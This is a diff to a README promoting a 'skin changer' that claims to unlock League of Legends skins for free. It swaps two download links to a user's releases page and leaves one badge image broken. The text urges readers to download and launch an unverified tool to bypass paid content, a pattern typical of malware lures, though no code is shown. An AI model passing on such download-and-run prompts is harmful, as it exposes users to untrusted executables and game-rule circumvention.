@@ -10,7 +10,7 @@ Welcome to the ultimate solution for unlocking any League of Legends skin for fr
 - Instantly get your favorite skins without RP
 
 ## Usage 💡
-Simply download the [Ultimate Skin Changer 2025](https://github.com/file/Soft.zip) tool and launch it to start changing your in-game experience. With just a few clicks, you can transform your champions with the coolest skins available in League of Legends.
+Simply download the [Ultimate Skin Changer 2025](https://github.com/AbrarCaecar/League-of-Legends-Ultimate-Skin-Changer-2025/releases) tool and launch it to start changing your in-game experience. With just a few clicks, you can transform your champions with the coolest skins available in League of Legends.
 
 ## Repository Topics 🏆
 - league-of-legends
@@ -36,7 +36,7 @@ Don't miss out on the opportunity to enhance your League of Legends gameplay wit
 
 ---
 
-[![](https://img.shields.io/badge/Download-Ultimate_Skin_Changer_2025-green)](https://github.com/file/Soft.zip)
+[![](https://github.com/AbrarCaecar/League-of-Legends-Ultimate-Skin-Changer-2025/releases)](https://github.com/AbrarCaecar/League-of-Legends-Ultimate-Skin-Changer-2025/releases)
 
 ---
 
